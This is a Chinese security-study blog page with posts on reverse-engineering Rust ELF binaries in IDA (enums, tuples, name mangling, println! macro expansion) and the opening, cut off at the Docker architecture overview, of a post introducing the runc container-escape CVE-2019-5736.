<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">z</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">a</span> = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">b</span> = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">c</span> = <span class="number">13</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&#123;&#125;&quot;</span>, x, y, z, a, b, c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>给出上面的两个Rust函数，通过查看6个整数值在内存中的排布可以发现，两者对于6个整数值都是按相同顺序进行排列，从低地址到高地址依次为2、3、5、7、11、13。不过在编译过程中发现，只有当变量被使用时，Rust编译器才会将这个变量编译到ELF中，否则这个变量将不会出现在ELF中。也就是说，我们不能仅仅通过栈内存排布判断源代码中是否定义了Tuple。不过转念一想，这样其实是合理的。Tuple实际上就相当于是一个匿名的结构体实例，想一想C语言中的结构体，实际上也就是将一堆各种类型的数据集合在一起，使用相邻的内存空间保存各个属性而已。定义一个具有两个int类型的C语言结构体，将其在栈内存中分配一个实例空间，与在栈内存中分配两个int类型的变量，在本质上是完全相同的。</p>
<p>因此，我们在对Rust ELF进行逆向分析时，不必纠结源码的编写者是否定义了元组，全部将其看做独立的变量就可以了。</p>
<h2 id="0x04-guess-a-number-part-2"><a class="markdownIt-Anchor" href="#0x04-guess-a-number-part-2"></a> 0x04. Guess a number .part 2</h2>
<p>好不容易说完了对Rust枚举类型和元组的逆向，接下来让我们回到最开始的那个程序，说到两个match语句。</p>
<p>对于第一个<code>match</code>语句，<code>match</code>的对象是一个枚举类型，在<code>match</code>语句体之内实际上是按照枚举类型进行分支。在汇编语句中，Rust是这样完成分支的：</p>
<p><img src="5.png" alt="" /></p>
<p>注意<code>0xCEAC</code>处的指令：<code>mov al, byte ptr [rsp+1D8h+var_C0]</code>，第二个操作数是<code>parse</code>方法的返回值，也就是<code>Result&lt;F, F::Err&gt;</code>。考虑到这里的<code>F</code>是<code>u32</code>类型，整个枚举类型占用的空间大小为8字节，因此<code>rax</code>返回的直接就是对象本身的内容（<code>0x??_0000_0000</code>）。第1个字节为枚举索引值，后4个字节为转换后的值。在<code>0xCEAC</code>地址的这条指令将第1个字节赋值给<code>al</code>后进行了比较（<code>cmp rax, 0</code>），这也就是分支的具体实现方法——提取出枚举类型的索引值，根据索引值进行分支。</p>
<p><img src="6.png" alt="" /></p>
<p>对于后面<code>cmp</code>方法返回值的<code>match</code>与之类似，本质上使用的也是<code>if-else</code>结构，主要是因为分支数量较少，没有必要使用跳转表，分支逻辑如上图所示。不过不同的是，第一个分支是判断枚举对象索引值是否等于<code>0xFF</code>，即-1。经过调试发现，<code>Ordering::Less</code>对应的枚举索引为-1，<code>Ordering::Greater</code>对应1，<code>Ordering::Equal</code>对应0。而对于每个分支，都只是一个简单的输出语句，这里就不再分析了。</p>
<h2 id="0x05-总结"><a class="markdownIt-Anchor" href="#0x05-总结"></a> 0x05. 总结</h2>
<p>在本文中，我们学习了：</p>
<ol>
<li>Rust的枚举类型在汇编代码层的数据结构实现。</li>
<li>Rust的元组Tuple类型在汇编代码层无法被有效识别，但可将其看做多个独立变量进行分析。</li>
<li>三个<code>Ordering</code>枚举对象的索引值为-1、0、1，与一般枚举对象索引值从0开始不同。</li>
<li>Rust倾向于当变量不再使用时就删除变量对象，以尽可能地提高安全性。</li>
<li>Rust的元组类型在汇编代码层栈空间的数据排列顺序与元组类型中数据的定义顺序不一定相同。</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/17/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/17/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">Rust逆向学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-17 21:50:25" itemprop="dateCreated datePublished" datetime="2023-10-17T21:50:25+08:00">2023-10-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-10-19 00:05:53" itemprop="dateModified" datetime="2023-10-19T00:05:53+08:00">2023-10-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近年来，Rust语言的热度越来越高，很多人都对Rust优雅的代码和优秀的安全性赞不绝口。对于开发是如此，对于CTF也是如此，在逆向题和pwn题中都有出现。从本文开始我们将开始进行Rust逆向的学习，笔者将尽可能通过现有的IDA（7.7版本）对Rust ELF文件中包含的特性进行分析与总结，尽可能地减少Rust逆向的难度，尽可能地解决分析过程中产生的每一个问题，最终争取达到能够通过IDA反汇编结果还原Rust代码的程度。</p>
<p>本系列将跟随《Rust权威指南》的学习路线完成Rust逆向工程的学习。</p>
<p>阅读本文前，建议首先掌握：</p>
<ul>
<li>✅ x86-64逆向的基础知识</li>
<li>✅ Rust语言的基本使用</li>
</ul>
<h1 id="hello-rust-reverse"><a class="markdownIt-Anchor" href="#hello-rust-reverse"></a> Hello, Rust Reverse</h1>
<p>首先我们写一个流程较猜数字稍简单一些的Rust程序，完成Rust ELF的第一次分析。<br />
以下是Rust源码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">input</span>: <span class="type">String</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> input).<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Read Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">num</span> = input.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Input not a number!&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="keyword">match</span> num &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="string">&quot;one&quot;</span>,</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="string">&quot;two&quot;</span>,</span><br><span class="line">        x <span class="keyword">if</span> x &lt; <span class="number">10</span> =&gt; <span class="string">&quot;Something smaller than 10&quot;</span>,</span><br><span class="line">        _ =&gt; <span class="string">&quot;Something not smaller than 10&quot;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用cargo build编译后将ELF文件放入IDA中进行分析。这个ELF文件没有去除符号表，便于分析。</p>
<h2 id="0x01-main函数定位"><a class="markdownIt-Anchor" href="#0x01-main函数定位"></a> 0x01. main函数定位</h2>
<p><img src="1.png" alt="" /></p>
<p>反汇编完成后，可以看到，左边栏的函数名大多很长，但也有一些规律可循。定位到main函数发现，main函数本身只有很少的几行代码，但Rust真正的main函数也不难找。看到<code>0xA020</code>处有一个main函数，这个项目笔者将其命名为revlab，而这个函数名中也正好就有revlab，因此可以推测出，这就是我们要找的Rust main函数。</p>
<p>但我们可以先不急着查看main函数的具体内容，单是这个main函数名就有一番研究的必要。<code>_ZN6revlab4main17h512e681518e409c2E</code>，这是Rust编译器赋予我们自己的main函数的函数名。有没有觉得这个函数名的命名规则很熟悉呢？没错，这种函数命名方式被称为<strong>name mangling</strong>，与C++编译器对函数的命名规则类似。这里参考<a target="_blank" rel="noopener" href="https://rustmagazine.github.io/rust_magazine_2021/chapter_7/hw-rust-name-mangling.html">资料</a>。我们就可以将这个函数名进行简单的翻译：<code>revlab::main</code>，前面的_ZN是固定开头，6代表下一个模块的名字长度，也就是后面的revlab，4相同，即解析main，17h后面是函数的哈希值，可以忽略。这里通过左边栏可以看到，IDA能够自动为我们完成函数名的解析。</p>
<h2 id="0x02-main函数分析"><a class="markdownIt-Anchor" href="#0x02-main函数分析"></a> 0x02. main函数分析</h2>
<p>别看我们第一次写的main函数只有短短的几行，转换成汇编之后却有点让人头疼。考虑到这是我们第一次进行分析，笔者尝试借助其他的工具辅助分析——<a target="_blank" rel="noopener" href="https://godbolt.org/">传送门</a>。这个网站可以帮助我们将源代码与汇编代码对应起来，帮助我们进行分析。</p>
<p><img src="2.png" alt="" /></p>
<p>可以看到，main函数的汇编逻辑还是比较复杂的，这也是Rust ELF的一个特点，使得Rust反汇编较C/C++更难。</p>
<h3 id="line-1"><a class="markdownIt-Anchor" href="#line-1"></a> line 1</h3>
<p>第一行定义了一个字符串变量，使用<code>String::new()</code>方法。但是在汇编中可以发现，<code>call</code>调用<code>String::new()</code>函数并没有对返回值进行操作，而是将<code>rdi</code>进行了赋值，这与C语言不同，如果按照C语言的逻辑，则更像是<code>String::new(&amp;input)</code>。随后，笔者修改了代码进行试验，发现<code>Vec</code>的<code>new</code>方法流程类似。可见各个对象的<code>new</code>方法实际上是传了参的。</p>
<h3 id="line-2"><a class="markdownIt-Anchor" href="#line-2"></a> line 2</h3>
<p>第二行就比第一行热闹多了，由于<code>io::stdin()</code>返回的是<code>Stdin</code>，代码中使用的返回值与C语言一样，保存在<code>rax</code>中。不过这里是首先将函数地址赋值给<code>rax</code>，通过<code>call rax</code>完成调用。调用完<code>stdin()</code>后，Rust不知道为什么用了一个<code>jmp</code>指令，跨越了几条指令再继续执行后面的<code>read_line</code>方法。对于<code>read_line</code>方法，可以看到前3个寄存器进行了赋值。其中<code>rsi</code>是<code>io::stdin()</code>的返回值，也就是<code>Stdin</code>对象实例，<code>rdx</code>是字符串<code>input</code>的地址，这一点可以通过第一行对<code>[rsp+80]</code>赋值得知，那么<code>rdi</code>是什么呢？这里就需要返回到IDA界面查看。</p>
<p><img src="3.png" alt="" /></p>
<p>从上图可知，IDA将第一个参数解析为<code>self</code>，类型为<code>core::result::Result&lt;usize,std::io::error::Error&gt;</code>，而这个是<code>read_line</code>函数的返回值。这与<code>io::stdin()</code>不同，也是没有将返回值保存到<code>rax</code>。随后，代码继续向下，继续调用了<code>expect</code>方法，传入的d第一个参数就是<code>Result</code>实例，第二个参数是我们设置的错误字符串<code>Read Error!</code>地址，第三个参数为11，推测是错误字符串的长度，第四个参数通过查看发现，是这段汇编代码对应的源代码在工程中的路径。由此我们可以发现，如果今后我们需要分析一个不带符号的Rust ELF，发现有一个函数有4个参数，其中第2、4个参数均为字符串，且第4个参数是源文件地址、第3个参数是第2个参数字符串的长度，那么这个函数很有可能就是<code>expect</code>，通过跟踪第一个参数<code>Result</code>对象，可以继续进行分析。</p>
<p>汇编代码看到这里，我们能够发现，即使代码顺序执行，Rust编译器也一定要在一个函数调用结束后插入一个<code>jmp</code>指令，这一点可以从调用<code>read_line</code>方法可以得知，向下不断滑动窗口也能发现，整个<code>main</code>函数似乎是被许多<code>jmp</code>指令划分为许多小部分。</p>
<h3 id="line-3"><a class="markdownIt-Anchor" href="#line-3"></a> line 3</h3>
<p><img src="4.png" alt="" /></p>
<p>第三行首先看到，代码中使用了<code>deref</code>这个方法，至于为什么使用这个方法其实很好理解。<code>deref</code>传入的是<code>String</code>实例，返回的是字符串切片<code>&amp;str</code>，而<code>trim</code>方法实际上是以切片作为<code>self</code>的，因此这里Rust隐式地将<code>String</code>转成切片之后再执行<code>trim</code>。</p>
<p>调用<code>deref</code>方法后需要注意，这里将<code>rdx</code>和<code>rax</code>保存到了栈中。记得在学习字符串切片的时候，书中有提及字符串切片实际上由两个部分组成——指针与长度。这里我们只通过静态分析无法判断<code>rdx</code>和<code>rax</code>到底是多少，虽然我们心中可能已经知道答案，但这里还是通过简单的调试来验证一下。</p>
<p><img src="5.png" alt="" /></p>
<p>可以看到，这与我们的预期是相同的，<code>rdx</code>保存的是长度，<code>rax</code>保存的是字符串指针。因此我们知道了，<code>String</code>类型的<code>deref</code>方法会将返回值保存在两个寄存器——<code>rdx</code>与<code>rax</code>中。</p>
<p>好继续往下看。随后就是<code>trim</code>方法的调用，传入的第1个参数是字符串指针，第2个参数是长度。其返回值依然是保存在两个寄存器中。可见对于返回值为<code>&amp;str</code>的Rust方法，其返回的方式也有一定规律。</p>
<p><code>trim</code>之后是<code>parse</code>，返回值是<code>Result</code>类型，和<code>read_line</code>不同的是，<code>read_line</code>返回的<code>Result</code>实例没有泛型（<code>Result&lt;usize&gt;</code>），但是<code>parse</code>的返回值是<code>Result&lt;F, F::Err&gt;</code>，可能是这个原因，导致<code>read_line</code>可以将<code>Result</code>指针直接作为参数传递，而<code>parse</code>只能通过<code>rax</code>返回。不过目前这只是猜测，有关于Rust编译器对泛型的处理，就留到后面的文章中进行分析吧。</p>
<p>随后，有几行看似没有意义的汇编代码，像是<code>mov qword ptr [rsp + 240], rax</code>，这里的<code>[rsp+240]</code>在main函数自始至终只有这里被使用过。所以直接忽略。随后<code>expect</code>的传参与之前规则相同。</p>
<p>不过这里的<code>expect</code>是需要将返回值保存在<code>num</code>中的，也就是<code>mov dword ptr [rsp + 28], eax</code>这条语句，可见<code>num</code>是保存在<code>[rsp+0x28]</code>的位置。</p>
<h3 id="line-4~9"><a class="markdownIt-Anchor" href="#line-4~9"></a> line 4~9</h3>
<p>下面的几行是一个<code>println!</code>一个<code>match</code>语句的值。在学Rust的时候我们了解到，<code>match</code>语句可以实现类似于lambda函数的功能，每一个分支的<code>=&gt;</code>后都可以看成这个条件下<code>match</code>的返回值。就如这几行是将<code>match</code>的每一个分支语句都定义一个字符串切片作为传入<code>println!</code><br />
的格式化参数。</p>
<p>在上一行语句执行结束后，汇编代码首先将<code>num</code>的值放到<code>eax</code>中，随后进行分支判断。判断顺序是：是否等于1、是否等于2、是否小于10，而且<code>match</code>的判断语句是统一写在前面，具体的语句内容则放在后面。</p>
<p>通过对分支语句简单分析，容易得到<code>match</code>语句的“返回值”是保存在<code>[rsp+208]</code>和<code>[rsp+216]</code>，因为这个是<code>&amp;str</code>，所以要用<code>0x10</code>大小保存。</p>
<p><img src="6.png" alt="" /></p>
<p>不过在汇编代码中，<code>println!</code>的处理流程可能不是都在所有<code>match</code>流程之后，而是在中间插入了一段，随后又在跳转到后面。使用1.69.0的rustc版本编译发现所有的<code>match</code>分支都位于<code>println!</code>之后，而更新版本的1.73.0则是将<code>println!</code>前半部分放在<code>match</code>分支部分中间。</p>
<p>随后则是<code>println!</code>的宏展开部分，考虑到<code>println!</code>太常见，通过IDA的反汇编输出的源代码可以识别出其特征。可以看到在汇编中调用了<code>core::fmt::ArgumentV1::new_display</code>、<code>core::fmt::Arguments::new_v1</code>、<code>std::io::stdio::_print</code>这三个方法。其中前面两个推测是Rust宏的转换函数，也就是将宏中大括号部分替换为具体的参数，而最后一个方法则是输出内容到控制台。</p>
<p>对于第一个函数，其唯一一个参数是<code>match</code>返回的字符串切片的栈地址。而对于第二个函数，传参情况则比较复杂。根据下文的<code>_print</code>函数传入的参数判断，第一个参数应该是返回值字符串的地址，第二个参数指向一个换行符的地址，但意义不明，第三个参数为2，第四个参数为第一个函数的返回值<code>rax</code>内容。第五个参数为1。目前只能确定第1个参数的含义，因此我们需要请求gdb的帮助。</p>
<p><img src="7.png" alt="" /></p>
<p>可以看到，第1个函数返回的<code>rax</code>是要输出的字符串。注意到在ELF中并没有找到左右大括号<code>&#123;&#125;</code>这个字符串，判断可能是Rust使用了其他的方式进行解析。但是除了第一个参数之外其他参数的意义还是不明。我们不妨稍稍修改一下<code>println!</code>格式化字符串的值，看看代码有什么变化。</p>
<p><img src="8.png" alt="" /></p>
<p>这里我们将字符串修改为<code>a&#123;&#125;a&#123;&#125;</code>，在后面添加一个1作为第二个括号的占位符。随后我们发现，<code>core::fmt::ArgumentV1::new_display</code>函数被调用了两次。第一次调用传入<code>match</code>返回的字符串，而第二次调用传入的是这个东西：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.L__unnamed_27:</span><br><span class="line">        .asciz  &quot;\001\000\000&quot;</span><br></pre></td></tr></table></figure>
<p>这不正好就是1吗？也就是说，<code>core::fmt::ArgumentV1::new_display</code>这个函数是用来解析<code>println!</code>后面的参数的，将其转换为字符串切片，有几个大括号就需要调用几次。随后继续进行分析，发现汇编代码将两个函数解析得到的两个字符串切片放到了一个连续的栈地址空间，并将其作为参数4（<code>rcx</code>）传入。</p>
<p><img src="9.png" alt="" /></p>
<p>如上图所示，这里红框部分就是赋值过程，这个地方像是一个数组的结构，按照顺序排列每个大括号对应的字符串切片。由此便可以判断出参数5（<code>r8d</code>）的含义，其实就是解析的字符串切片的数量。</p>
<p>接下来我们再看一下参数2到底是什么东西。参数2指向了一个这样的结构：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.L__unnamed_28:</span><br><span class="line">        .quad   .L__unnamed_36</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br><span class="line">        .quad   .L__unnamed_36</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br><span class="line">        .quad   .L__unnamed_37</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br></pre></td></tr></table></figure>
<p>其中有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.L__unnamed_36:</span><br><span class="line">        .byte   97      ; &#x27;a&#x27;</span><br><span class="line"></span><br><span class="line">.L__unnamed_37:</span><br><span class="line">        .byte   10      ; &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>
<p>这样看来，这里的含义也就清楚了。编译器在对宏进行展开时转义大括号的内容是这样操作的：</p>
<ul>
<li>首先将含有大括号的字符串以大括号分隔，并形成上面的这个数组结构。</li>
<li>对于每一个大括号，都调用一次转义函数进行转义，在栈中形成一个<code>&amp;str</code>的数组。</li>
<li>随后再调用另外一个函数（<code>core::fmt::Arguments::new_v1</code>）将这些切片拼起来组成最终的字符串。</li>
</ul>
<p><code>core::fmt::Arguments::new_v1</code>的5个参数含义分别就是：</p>
<ul>
<li><code>rdi</code>：输出字符串指针</li>
<li><code>rsi</code>：预编译的数组结构，表示宏不需要转义的字符串部分</li>
<li><code>rdx</code>：预编译数组结构的长度</li>
<li><code>rcx</code>：运行时解析的已经被转义的<code>&amp;str</code>数组</li>
<li><code>r8</code>：运行时解析的<code>&amp;str</code>数组长度</li>
</ul>
<p>这个函数调用完之后，就可以进行宏展开的后续代码了。对于<code>println!</code>而言是输出，也即调用<code>std::io::stdio::_print</code>。</p>
<p>输出之后，后面就没有多少代码了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.LBB60_18:</span><br><span class="line">        lea     rdi, [rsp + 80]</span><br><span class="line">        call    qword ptr [rip + core::ptr::drop_in_place&lt;alloc::string::String&gt;@GOTPCREL]</span><br><span class="line">        add     rsp, 248</span><br><span class="line">        ret</span><br><span class="line">        mov     rax, qword ptr [rip + core::panicking::panic_cannot_unwind@GOTPCREL]</span><br><span class="line">        call    rax</span><br><span class="line">        ud2</span><br><span class="line">.LBB60_20:</span><br><span class="line">        mov     rdi, qword ptr [rsp + 224]</span><br><span class="line">        call    _Unwind_Resume@PLT</span><br><span class="line">        ud2</span><br></pre></td></tr></table></figure>
<p>这里的<code>core::ptr::drop_in_place</code>应该是Rust将这个<code>String</code>对象实例回收了。随后将栈上抬，main函数就正常返回了。</p>
<h2 id="0x03-ida反汇编"><a class="markdownIt-Anchor" href="#0x03-ida反汇编"></a> 0x03. IDA反汇编</h2>
<p>上一节我们对Rust ELF的分析大多是基于汇编层面进行的，当代码量比较多的时候，基本块之间的跳转关系可能会更加复杂，不利于我们的分析。不过IDA提供了非常实用的反汇编功能，在分析时，笔者认为如果我们能够将反汇编的内容与纯汇编代码相结合，效果会更好。</p>
<p>但IDA的反汇编功能一开始毕竟是为C/C++设计的，对于Rust的反汇编结果不很直观也是正常的。</p>
<p><img src="10.png" alt="" /></p>
<p>在反汇编的输出结果中，出现了比较奇怪的地方。</p>
<p>最为明显的就是字符串的解析。通过查看ELF中保存字符串的地方可以发现，Rust的字符串与字符串之间有的是以换行符隔开的，有的根本就没有分割的字符，这与C/C++使用0字符分割每个字符串不同。因为Rust字符串切片的特性，对一个字符串切片的操作必然需要使用到这个切片的长度。既然已经知道了字符串的长度，字符串与字符串之间的分隔就显得没有那么必要了。</p>
<p>不过庆幸的是，反汇编中对于main函数的主要逻辑的解析还是比较清楚的，第一行的<code>String::new()</code>表示创建了一个<code>String</code>实例，随后多个函数的调用连在一起就组成了第二行的读取字符串内容，就是<code>expect</code>函数的解析看上去不是很舒服，毕竟其与C/C++的函数调用规则有些许不同。</p>
<p>再往下，可以看到<code>deref</code>、<code>trim</code>、<code>parse</code>、<code>expect</code>，这些函数组成了第三行的内容。</p>
<p>对于接下来的<code>match</code>，在反汇编界面中是将其解析成了多个<code>if-else</code>语句。随后就是<code>println!</code>的宏展开，输出字符串。输出后通过<code>drop_in_place</code>删除了一开始创建的<code>String</code>实例，函数返回。</p>
<h2 id="0x04-总结"><a class="markdownIt-Anchor" href="#0x04-总结"></a> 0x04. 总结</h2>
<p>以上就是我们的第一次Rust逆向尝试，还是有很多收获的，下面是本文的总结：</p>
<ol>
<li>Rust的main函数与ELF中的main不同，但很好找。</li>
<li>Rust编译器喜欢将代码用<code>jmp</code>指令分割为一个个小部分。</li>
<li>对于返回<code>&amp;str</code>的方法，是将切片的指针和长度分别保存在<code>rax</code>和<code>rdx</code>之中。</li>
<li>对于<code>struct</code>的<code>new</code>方法，一般可在反汇编界面中直接识别，在汇编中实际执行的更像是通过<code>xxx.new(&amp;target)</code>的方式进行初始化。</li>
<li>Rust对宏展开的处理有一定的规律，可通过这些规律在反汇编界面中识别出宏展开的部分。</li>
</ol>
<p>不得不说，Rust编译器在汇编层面的处理还是有点意思的。在后面的文章中，我们将尝试分析更加复杂的代码，尝试整理出更多Rust语言特性在汇编层面中的实现方式。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/14/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/14/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0-1/" class="post-title-link" itemprop="url">容器逃逸学习 (1)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-10-14 19:02:57" itemprop="dateCreated datePublished" datetime="2023-10-14T19:02:57+08:00">2023-10-14</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-10-16 17:01:45" itemprop="dateModified" datetime="2023-10-16T17:01:45+08:00">2023-10-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">容器逃逸系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近年来，有些pwn题会出一些有关于容器逃逸的题目，虽然很多都是板子题，但如果没有学过相关内容，比赛的时候还是会两眼一抹黑。因此本文将开始容器逃逸的相关内容学习。</p>
<p>笔者的计划是，通过具体的已发布的漏洞开始，逐步向底层逻辑前进。</p>
<p>在这第1篇文章中，我们从一个CVE漏洞开始——CVE-2019-5736，作为容器逃逸的入门。</p>
<p>主要参考资料：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/266144563">传送门</a>（笔者觉得这篇文章写的非常好）</p>
<p>这是一个著名的Docker容器逃逸漏洞，影响范围为：Docker 18.09.2及以前，这些版本的Docker使用了1.0-rc6及以下的docker-runc从而导致漏洞。漏洞的成因是攻击者对主机的runc二进制文件进行重写，从而在提权的同时完成逃逸。下面我们就来具体了解一下这个漏洞本身。</p>
<h1 id="1-docker架构简介"><a class="markdownIt-Anchor" href="#1-docker架构简介"></a> 1. Docker架构简介</h1>
<p>要了解这个漏洞，首先就要了解docker-runc是干什么的。我们从<a target="_blank" rel="noopener" href="https://download.docker.com/linux/static/test/x86_64/">这里</a>可以下载到各种版本的Docker，其中大多都是压缩包。解压压缩包我们会发现其中有几个可执行文件：</p>
<ul>
<li>docker: Docker客户端程序，也是我们最常用的elf，用于对镜像、容器等进行操作。</li>
